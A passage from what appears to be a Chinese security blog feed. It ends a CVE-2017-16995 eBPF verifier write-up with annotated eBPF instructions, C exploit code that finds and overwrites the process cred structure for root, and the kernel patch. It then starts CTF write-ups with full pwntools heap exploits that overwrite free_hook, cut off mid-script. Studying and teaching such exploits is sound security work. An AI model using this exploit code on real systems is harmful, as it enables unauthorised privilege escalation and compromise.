BPF_REG_0, <span class="hljs-number">0</span>, <br>                   BPF_FUNC_map_lookup_elem)<br>[<span class="hljs-number">27</span>]: JMP_JNE_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x0</span>)<br>[<span class="hljs-number">28</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<br>[<span class="hljs-number">29</span>]: LDX_MEM_DW(BPF_REG_8, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r8 = [r0] = map[2]</span><br>----------------------------------------------------------------------------<br>[<span class="hljs-number">30</span>]: ALU64_MOV_X(BPF_REG_2, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r2=r0</span><br>[<span class="hljs-number">31</span>]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r0=0</span><br>[<span class="hljs-number">32</span>]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">// if r6 != 0 jmp 36</span><br>[<span class="hljs-number">33</span>]: LDX_MEM_DW(BPF_REG_3, BPF_REG_7, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r3=[r7]</span><br>[<span class="hljs-number">34</span>]: STX_MEM_DW(BPF_REG_2, BPF_REG_3, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//[r2]=r3</span><br>[<span class="hljs-number">35</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit</span><br>[<span class="hljs-number">36</span>]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x1</span>)<span class="hljs-comment">//if r6 !=1 1 jmp 39</span><br>[<span class="hljs-number">37</span>]: STX_MEM_DW(BPF_REG_2, BPF_REG_10, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//[r2]=r10=rbp</span><br>[<span class="hljs-number">38</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit</span><br>[<span class="hljs-number">39</span>]: STX_MEM_DW(BPF_REG_7, BPF_REG_8, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//[r7]=r8</span><br>[<span class="hljs-number">40</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit</span><br></code></pre></td></tr></table></figure><p>下面对这个程序进行分析：<br>首先，[0]<del>[3]已经分析过了下面对后续指令进行分析：<br>第[4]</del>[5]条语句可用由上面的map知识得到，第五条语句是填充语句，当执行完后，会将map的地址存放在r9寄存器中。<br>[6]~[13]语句的类C代码如下，即调用BPF_FUNC_map_lookup_elem(map_add, idx)，并将返回值存到r6寄存器中，即 r6 = map[0]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">[<span class="hljs-number">6</span>]: r1 = r9<br>[<span class="hljs-number">7</span>]: r2 = rbp<br>[<span class="hljs-number">8</span>]: r2 = r2<span class="hljs-number">-4</span><br>[<span class="hljs-number">9</span>]: [rbp+(<span class="hljs-number">-4</span>)] = <span class="hljs-number">0</span> (idx)<br>[<span class="hljs-number">10</span>]: call BPF_FUNC_map_lookup_elem<br>[<span class="hljs-number">11</span>]: <span class="hljs-keyword">if</span> r0 == <span class="hljs-number">0</span>:<br>[<span class="hljs-number">12</span>]: <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>)<br>[<span class="hljs-number">13</span>]: r6 = [r0]<br></code></pre></td></tr></table></figure><p>[14]<del>[21]同理，将 r7 = map[1]。[22]</del>[29]为 r8 = map[2]，而map的内容可以由用户态传入。<br>最后[30]~[40]分为三个部分</p><ol><li><p>map[0]为0：r3 = map[1]地址所指的内容, map[2] = r3，由于map1值可控，我们通过此指令组合实现任意地址泄露</p></li><li><p>map[0]为1：将rbp存储到map[2]中，泄露内核栈基址</p></li><li><p>map[0]为2：将map[2]的值写入到map[1]的地址上去，我们通过此指令组合实现任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// r6 == map[0]r7 == map[1]r8 == map[2]</span><br>[<span class="hljs-number">30</span>]: ALU64_MOV_X(BPF_REG_2, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r2 = r0 = map[2]</span><br>[<span class="hljs-number">31</span>]: ALU64_MOV_K(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r0 = 0</span><br>[<span class="hljs-number">32</span>]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, <span class="hljs-number">0x3</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//if(r6 != 0) jmp 36</span><br>[<span class="hljs-number">33</span>]: LDX_MEM_DW(BPF_REG_3, BPF_REG_7, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//r3 = [r7]</span><br>[<span class="hljs-number">34</span>]: STX_MEM_DW(BPF_REG_2, BPF_REG_3, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//[r2] = r3</span><br>[<span class="hljs-number">35</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit</span><br>[<span class="hljs-number">36</span>]: JMP_JNE_K(BPF_REG_6, BPF_REG_0, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x1</span>)<span class="hljs-comment">//if(r6 != 1) jmp 39</span><br>[<span class="hljs-number">37</span>]: STX_MEM_DW(BPF_REG_2, BPF_REG_10, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//[r2] = r10 = rbp</span><br>[<span class="hljs-number">38</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit</span><br>[<span class="hljs-number">39</span>]: STX_MEM_DW(BPF_REG_7, BPF_REG_8, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//[r7] = r8</span><br>[<span class="hljs-number">40</span>]: JMP_EXIT(BPF_REG_0, BPF_REG_0, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x0</span>)<span class="hljs-comment">//exit</span><br></code></pre></td></tr></table></figure></li><li><p>创建map，加载eBPF指令，绑定到socket</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span>  <span class="hljs-title">initialize</span><span class="hljs-params">()</span> </span>&#123;<br>...<br>mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>), <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>), <span class="hljs-number">3</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (mapfd &lt; <span class="hljs-number">0</span>) &#123;<br>fail(<span class="hljs-string">&quot;failed to create bpf map: &#x27;%s&#x27;\n&quot;</span>, strerror(errno));<br>&#125;<br><br>redact(<span class="hljs-string">&quot;sneaking evil bpf past the verifier\n&quot;</span>);<br>progfd = load_prog();<br><span class="hljs-keyword">if</span> (progfd &lt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-keyword">if</span> (errno == EACCES) &#123;<br>msg(<span class="hljs-string">&quot;log:\n%s&quot;</span>, bpf_log_buf);<br>&#125;<br>fail(<span class="hljs-string">&quot;failed to load prog &#x27;%s&#x27;\n&quot;</span>, strerror(errno));<br>&#125;<br><br>redact(<span class="hljs-string">&quot;creating socketpair()\n&quot;</span>);<br><span class="hljs-keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="hljs-number">0</span>, sockets)) &#123;<br>fail(<span class="hljs-string">&quot;failed to create socket pair &#x27;%s&#x27;\n&quot;</span>, strerror(errno));<br>&#125;<br><br>redact(<span class="hljs-string">&quot;attaching bpf backdoor to socket\n&quot;</span>);<br><span class="hljs-keyword">if</span>(setsockopt(sockets[<span class="hljs-number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="hljs-keyword">sizeof</span>(progfd)) &lt; <span class="hljs-number">0</span>) &#123;<br>fail(<span class="hljs-string">&quot;setsockopt &#x27;%s&#x27;\n&quot;</span>, strerror(errno));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>寻找cred结构体，这里的exp寻找不是基于thread_info结构体中的task_struct，而是通过泄露socket地址从另一个结构体变量中找到cred。在经典版本中，用的是泄露内核栈地址addr，然后用addr &amp; ~(0x400-1)来找thread_info进而找cred。这个原理是内核栈和thread_info位置相邻，地址有对应关系。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">find_cred</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">uid_t</span> uid = getuid();<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> skbuff = get_skbuff();<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * struct sk_buff &#123;</span><br><span class="hljs-comment"> *     [...24 byte offset...]</span><br><span class="hljs-comment"> *     struct sock     *sk;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> sock_addr = read64(skbuff + <span class="hljs-number">24</span>);<br>msg(<span class="hljs-string">&quot;skbuff =&gt; %llx\n&quot;</span>, skbuff);<br>msg(<span class="hljs-string">&quot;Leaking sock struct from %llx\n&quot;</span>, sock_addr);<br><span class="hljs-keyword">if</span>(sock_addr &lt; PHYS_OFFSET)&#123;<br>fail(<span class="hljs-string">&quot;Failed to find Sock address from sk_buff.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * scan forward for expected sk_rcvtimeo value.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * struct sock &#123;</span><br><span class="hljs-comment"> *    [...]</span><br><span class="hljs-comment"> *    const struct cred      *sk_peer_cred; </span><br><span class="hljs-comment"> *    long                    sk_rcvtimeo;             </span><br><span class="hljs-comment"> *  &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++, sock_addr += <span class="hljs-number">8</span>) &#123;<br><span class="hljs-keyword">if</span>(read64(sock_addr) == <span class="hljs-number">0x7FFFFFFFFFFFFFFF</span>) &#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cred_struct = read64(sock_addr - <span class="hljs-number">8</span>);<br><span class="hljs-keyword">if</span>(cred_struct &lt; PHYS_OFFSET) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> test_uid = (read64(cred_struct + <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>);<br><br><span class="hljs-keyword">if</span>(test_uid != uid) &#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>                        msg(<span class="hljs-string">&quot;Sock-&gt;sk_rcvtimeo at offset %d\n&quot;</span>, i * <span class="hljs-number">8</span>);<br>                        msg(<span class="hljs-string">&quot;Cred structure at %llx\n&quot;</span>, cred_struct);<br>msg(<span class="hljs-string">&quot;UID from cred structure: %d, matches the current: %d\n&quot;</span>, test_uid, uid);<br><br><span class="hljs-keyword">return</span> cred_struct;<br>&#125;<br>&#125;<br>fail(<span class="hljs-string">&quot;failed to find sk_rcvtimeo.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用任意地址写功能将cred的uid改为0，起root shell。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hammer_cred</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr)</span> </span>&#123;<br>    msg(<span class="hljs-string">&quot;hammering cred structure at %llx\n&quot;</span>, addr);<br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> w64(w) &#123; write64(addr, (w)); addr += 8; &#125;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> val = read64(addr) &amp; <span class="hljs-number">0xFFFFFFFF</span>UL;<br>    w64(val); <br>    w64(<span class="hljs-number">0</span>); w64(<span class="hljs-number">0</span>); w64(<span class="hljs-number">0</span>); w64(<span class="hljs-number">0</span>);<br>    w64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>); <br>    w64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>); <br>    w64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>); <br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> w64</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/09/24/C32Rj8wGT6a1MFq.png" alt="image.png"></p></li></ol><p><img src="https://s2.loli.net/2022/09/24/lRC9qFITD4wjPty.png" alt="image.png"><br>至此漏洞分析结束</p><h1 id="漏洞patch"><a href="#漏洞patch" class="headerlink" title="漏洞patch"></a>漏洞patch</h1><p>漏洞的patch如下<a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=95a762e2c8c942780948091f8f2a4f32fce1ac6f">kernel/git/torvalds/linux.git</a><br>这里在do_check里添加了对于BPF_ALU64指令的判断，从而将64和32的比较区分开来，使得预先check和实际run code的检查环境一致，该漏洞无法再被利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c<br>index <span class="hljs-number">625e358</span>ca765e..c086010ae51ed <span class="hljs-number">100644</span><br>--- a/kernel/bpf/verifier.c<br>+++ b/kernel/bpf/verifier.c<br>@@ <span class="hljs-number">-2408</span>,<span class="hljs-number">7</span> +<span class="hljs-number">2408</span>,<span class="hljs-number">13</span> @@ <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">check_alu_op</span><span class="hljs-params">(struct bpf_verifier_env *env, struct bpf_insn *insn)</span></span><br><span class="hljs-function">  * remember the value we stored into <span class="hljs-keyword">this</span> reg</span><br><span class="hljs-function">  */</span><br><span class="hljs-function"> regs[insn-&gt;dst_reg].type </span>= SCALAR_VALUE;<br>-__mark_reg_known(regs + insn-&gt;dst_reg, insn-&gt;imm);<br>+<span class="hljs-keyword">if</span> (BPF_CLASS(insn-&gt;code) == BPF_ALU64) &#123;<br>+__mark_reg_known(regs + insn-&gt;dst_reg,<br>+ insn-&gt;imm);<br>+&#125; <span class="hljs-keyword">else</span> &#123;<br>+__mark_reg_known(regs + insn-&gt;dst_reg,<br>+ (u32)insn-&gt;imm);<br>+&#125;<br> &#125;<br> <br> &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (opcode &gt; BPF_END) &#123;<br></code></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a href="http://p4nda.top/2019/01/18/CVE-2017-16995">http://p4nda.top/2019/01/18/CVE-2017-16995</a></p><p><a href="https://v1ckydxp.github.io/2019/09/02/2019-09-02-cve-2017-16995%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://v1ckydxp.github.io/2019/09/02/2019-09-02-cve-2017-16995%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://xz.aliyun.com/t/7782">https://xz.aliyun.com/t/7782</a></p><p><a href="https://xz.aliyun.com/t/2212">https://xz.aliyun.com/t/2212</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>虎符、DSCTF、强网的简单记录</title>
    <link href="/2022/08/01/%E8%99%8E%E7%AC%A6%E3%80%81DSCTF%E3%80%81%E5%BC%BA%E7%BD%91%E7%9A%84%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/08/01/%E8%99%8E%E7%AC%A6%E3%80%81DSCTF%E3%80%81%E5%BC%BA%E7%BD%91%E7%9A%84%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>最近打了一下近期的几场CTF比赛，随缘记录一下</p><h1 id="DSCTF-2022"><a href="#DSCTF-2022" class="headerlink" title="DSCTF 2022"></a>DSCTF 2022</h1><h2 id="gonote"><a href="#gonote" class="headerlink" title="gonote"></a>gonote</h2><p>size 可为负数，导致堆溢出，构造 overlap chunk 改 free_hook 为 system 的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./gonote&#x27;</span><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;39.106.154.70&#x27;</span>, <span class="hljs-number">13564</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">index, size, content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">convert</span>(<span class="hljs-params">size</span>):</span><br><span class="hljs-keyword">if</span> size &gt;= <span class="hljs-number">0</span>:<br><span class="hljs-keyword">return</span> size<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-number">0xffff</span> + size +<span class="hljs-number">1</span><br><span class="hljs-comment"># gdb.attach(p, &#x27;b *0x48F3EC&#x27;)</span><br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br>add(<span class="hljs-number">1</span>, -convert(<span class="hljs-number">0xffff</span>-<span class="hljs-number">0x500</span>), <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x100</span>, <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>, -convert(<span class="hljs-number">0xffff</span>-<span class="hljs-number">0x100</span>), <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span> + p64(<span class="hljs-number">0x621</span>) + <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>, -convert(<span class="hljs-number">0xffff</span>-<span class="hljs-number">0x500</span>), <span class="hljs-string">&#x27;verf1sh&#x27;</span>)<br>show(<span class="hljs-number">2</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x70</span> - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>success(<span class="hljs-string">&#x27;libc_base -&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(libc_base)))<br>pause()<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span>, -convert(<span class="hljs-number">0xffff</span>-<span class="hljs-number">0x100</span>), <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span> + p64(<span class="hljs-number">0x621</span>) + p64(free_hook))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x20</span>, p64(system))<br>free(<span class="hljs-number">4</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="rusty"><a href="#rusty" class="headerlink" title="rusty"></a>rusty</h2><p>题目本身逆向很复杂，但比赛的时候提示了为off by one漏洞，直接照着模板打了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>binary = <span class="hljs-string">&#x27;./rusty&#x27;</span><br>local = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> local:<br>p = process(binary)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&#x27;39.105.187.159&#x27;</span>, <span class="hljs-number">30008</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Command: &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;Size: 